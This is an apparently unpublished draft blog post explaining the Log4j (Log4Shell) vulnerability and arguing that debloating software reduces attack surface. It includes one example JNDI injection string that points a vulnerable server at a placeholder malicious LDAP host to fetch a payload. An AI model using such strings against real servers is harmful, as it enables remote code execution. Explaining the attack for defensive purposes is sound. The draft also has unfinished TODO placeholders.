---
layout: post
title: Why Debloating Software Based on User Usage?
subtitle: The case of the Log4j vulnerability
tags: security
description: TODO
keywords:
  - debloating,
  - log4j,
  - security,
  - vulnerabilities,
  - software engineering
image: ../img/posts/2020/2022-06-15/satyr-cover.jpg
share-img: ../img/posts/2020/2022-06-15/satyr-cover.jpg
show-avatar: false
date: 2022/06/15
author: cesarsotovalero
published: false
---

TODO

<figure class="jb_picture">
  {% responsive_image path: img/posts/2022/2022-06-15/satyr.jpg alt:"TODO" %}
  <figcaption class="stroke"> 
    &#169; Let's . Photo from a wooden satyr at <a href="https://goo.gl/maps/9SCooHLsZwRLTcbt6">Stockholms Centralstation</a>.
  </figcaption>
</figure>

# The Log4j Vulnerability

In December 2021, a critical vulnerability was discovered in the popular Java logging library log4j2.
The versions affected ranged [between 2.0-beta9 and 2.14.1 included](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q). 
This vulnerability was assigned the identifier [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

The vulnerability stemmed from the `JndiLookup` class in log4j, which allowed JNDI (Java Naming and Directory Interface) lookups. 
When log4j is configured to log unsanitized user input, an attacker can insert a malicious string (like `${jndi:ldap://malicious.server/payload}`) which would cause log4j to initiate a JNDI lookup.
This can lead to Remote Code Execution (RCE) because certain JNDI services, like LDAP, can return serialized Java objects, allowing the attacker to run arbitrary code on the affected server.

> The Java Naming and Directory Interface (JNDI) is an API that allows applications to discover and look up data and objects via a name. These objects can be anything from simple data items (like strings and numbers) to more complex network services. JNDI lookup is essentially the process of retrieving an object or piece of data bound to a particular name in a naming or directory service.

Because log4j is ubiquitously used in Java applications, this vulnerability was particularly alarming.
The impact was widespread, affecting countless systems, and required immediate patching. 
A patch (2.15.0) was swiftly released by the Apache Logging team that removed the vulnerable feature, and many organizations rushed to update their log4j versions or implement mitigations like JVM flags or firewall rules.

Apart from the direct RCE exploit, this vulnerability also opened up doors to other attack vectors like Denial of Service (DoS) via extremely resource-intensive JNDI lookups, or Information Disclosure as the malicious server can capture IP addresses of the servers making the lookup.

This incident also highlighted the importance of being cautious when parsing and logging untrusted input, and emphasized the need for regular security reviews of even well-established and trusted libraries in the software ecosystem.

https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/
https://logging.apache.org/log4j/2.x/security.html

# Does Debloating Helps?

The log4j vulnerability brought to light the dangers of excess code and features in widely used libraries. 
A library as pervasive as log4j having a critical flaw suggests that even well-maintained codebases can contain dormant vulnerabilities, especially in rarely used features. 
This incident underscores the importance of debloating—reducing the codebase by removing or disabling code not necessary for a particular application's functionality.

Software debloating allows organizations to reduce the attack surface of their applications by removing unnecessary features and components.
Reduced codebase means a reduced attack surface.
If parts of a library or software aren't present, they can't be exploited.
Based on thi premise, fewer components and lines of code in a software product can lead to fewer vulnerabilities.
This reduction in vulnerabilities arises because there are fewer points for an attacker to target.

In the case of log4j, the vulnerability stemmed from a particular feature related to the `JndiLookup` class that permitted JNDI (Java Naming and Directory Interface) lookups.
This feature was exploited in the vulnerability for remote code execution by sending specifically crafted inputs that the library would process.

Many applications that used log4j didn't even require the `JndiLookup` functionality or the ability to process JNDI lookups. 
However, since this feature was present in the library, and the library was integrated into their applications, they became vulnerable.
If this feature had been removed or wasn't a part of the version of the library they were using, the vulnerability would have had no impact on them, even if the flaw still existed in the code of the broader log4j project.

If an organization had debloated their version of log4j, removing features and components they didn't use, including the `JndiLookup` class, they would have naturally been immune to this particular vulnerability.
This example underscores the principle that removing or disabling unnecessary components can reduce the potential points of failure or exploitation in software.

# Software Debloating Strategies

1. **Static Analysis-Based Debloating:**
  - **Principle**: Analyze the software without executing it.
  - **Example**: Using tools like ProGuard for Java, which can identify and remove unused classes, fields, methods, and attributes based on the application's usage. Considering log4j, if an application only uses certain logging functionalities, a static analysis tool might prune away the unused features, potentially including the problematic `JndiLookup` class.
  - **Advantages**: No need to run the software, usually faster than dynamic analysis, can be integrated into build processes.
  - **Challenges**: Over-approximation might lead to removing code that's actually needed or under-approximation might leave more code than necessary.

2. **Dynamic Analysis-Based Debloating:**
  - **Principle**: Analyze the software by executing it, typically under various scenarios.
  - **Example**: Profiling a Java application during its runtime to see which methods of a library like log4j are invoked and which aren't. If certain methods are never called across various representative runs, they can be considered for removal.
  - **Advantages**: More accurate than static analysis since it's based on real execution patterns.
  - **Challenges**: Need representative workloads or usage scenarios. Might miss some code paths that are only invoked in rare situations.

3. **Profile-Guided Debloating:**
  - **Principle**: Combines both static and dynamic analysis. Software is first profiled (dynamic analysis) to collect data on which parts are most used, then that data guides static debloating processes.
  - **Example**: Running an application server under peak loads to gather profile data, and then passing that data to a tool that prunes unused parts of libraries like log4j.
  - **Advantages**: Combines the accuracy of dynamic analysis with the thoroughness of static tools.
  - **Challenges**: More complex, needs both runtime profiling and post-profiling analysis stages.

# Conclusion

While debloating can offer significant advantages, it's essential to ensure that the software still behaves correctly after the debloating process. Rigorous testing is crucial. The log4j vulnerability offers a poignant lesson on the latent dangers in extraneous code and features. In our increasingly security-conscious world, code debloating based on user usage might shift from being an optimization strategy to a critical security measure.

In conclusion, the log4j incident serves as a compelling illustration of the statement's validity.
It emphasizes the security benefits of minimizing code and features to only what is necessary for a given application or service, thereby reducing the overall risk profile.


# References

- TODO
- TODO
- TODO


